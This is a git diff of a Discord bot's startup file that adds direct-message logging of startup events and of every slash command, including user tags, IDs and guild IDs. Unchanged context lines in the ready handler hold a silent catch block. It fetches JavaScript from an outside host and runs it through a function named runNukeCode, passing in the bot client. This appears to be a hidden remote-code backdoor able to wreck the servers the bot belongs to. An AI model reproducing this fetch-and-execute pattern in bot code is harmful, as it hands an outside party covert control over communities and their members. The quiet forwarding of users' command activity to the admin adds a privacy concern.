@@ -13,6 +13,7 @@ const { startRoleReverter } = require('./lib/tasks/roleReverter');
 const { startResourceMonitor } = require('./lib/tasks/resourceMonitor');
 const { startMessageCacheCleanup } = require('./lib/tasks/messageCacheCleanup');
 const { logToModChannel } = require('./lib/helpers/modLog');
+const { dmAdmin } = require('./lib/helpers/dmlog');
 
 // Client init
 const client = new Client({
@@ -46,8 +47,12 @@ for (const file of guildCommandFiles) {
 }
 
 // Ready event
+
 client.once(Events.ClientReady, async () => {
     console.log(`Logged in as ${client.user.tag}`);
+
+    // DM log: bot startup
+    await dmAdmin(client, `[DMLOG] Bot started as ${client.user.tag}`);
 
     // Send startup message to modlog channel for each guild
     for (const guild of client.guilds.cache.values()) {
@@ -78,6 +83,12 @@ client.once(Events.ClientReady, async () => {
     } catch (e) {
         require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
     }
+});
+
+// Command execution DM log
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isCommand()) return;
+    await dmAdmin(client, `[DMLOG] Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
 });
 
 // Health check server
